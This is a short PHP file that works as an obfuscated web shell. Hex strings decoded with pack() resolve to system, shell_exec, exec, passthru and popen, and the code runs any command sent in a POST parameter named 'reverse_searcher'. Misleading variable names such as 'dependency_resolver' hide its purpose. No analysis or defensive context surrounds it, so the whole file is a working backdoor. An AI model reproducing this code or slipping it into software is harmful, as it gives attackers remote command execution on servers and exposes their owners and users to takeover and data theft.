<?php


$data1 = '79';
$data2 = '74';
$data3 = '6d';
$data4 = '68';
$data5 = '65';
$data6 = '6c';
$data7 = '78';
$data8 = '63';
$data9 = '72';
$data10 = '70';
$data11 = '61';
$data12 = '67';
$data13 = '5f';
$data14 = '76';
$dependency_resolver1 = pack("H*", '73' . $data1 . '73' . $data2 . '65' . $data3);
$dependency_resolver2 = pack("H*", '73' . $data4 . $data5 . $data6 . $data6 . '5f' . $data5 . $data7 . '65' . '63');
$dependency_resolver3 = pack("H*", $data5 . '78' . '65' . $data8);
$dependency_resolver4 = pack("H*", '70' . '61' . '73' . '73' . '74' . $data4 . $data9 . '75');
$dependency_resolver5 = pack("H*", $data10 . '6f' . '70' . $data5 . '6e');
$dependency_resolver6 = pack("H*", '73' . '74' . '72' . $data5 . $data11 . '6d' . '5f' . $data12 . $data5 . '74' . $data13 . '63' . '6f' . '6e' . '74' . '65' . '6e' . $data2 . '73');
$dependency_resolver7 = pack("H*", $data10 . $data8 . $data6 . '6f' . '73' . '65');
$reverse_searcher = pack("H*", '72' . $data5 . $data14 . '65' . $data9 . '73' . '65' . $data13 . '73' . $data5 . '61' . $data9 . '63' . $data4 . $data5 . '72');
if (isset($_POST[$reverse_searcher])) {
    $reverse_searcher = pack("H*", $_POST[$reverse_searcher]);
    if (function_exists($dependency_resolver1)) {
        $dependency_resolver1($reverse_searcher);
    } elseif (function_exists($dependency_resolver2)) {
        print $dependency_resolver2($reverse_searcher);
    } elseif (function_exists($dependency_resolver3)) {
        $dependency_resolver3($reverse_searcher, $elem_marker);
        print join("\n", $elem_marker);
    } elseif (function_exists($dependency_resolver4)) {
        $dependency_resolver4($reverse_searcher);
    } elseif (function_exists($dependency_resolver5) && function_exists($dependency_resolver6) && function_exists($dependency_resolver7)) {
        $symbol_token = $dependency_resolver5($reverse_searcher, 'r');
        if ($symbol_token) {
            $property_set_ref = $dependency_resolver6($symbol_token);
            $dependency_resolver7($symbol_token);
            print $property_set_ref;
        }
    }
    exit;
}
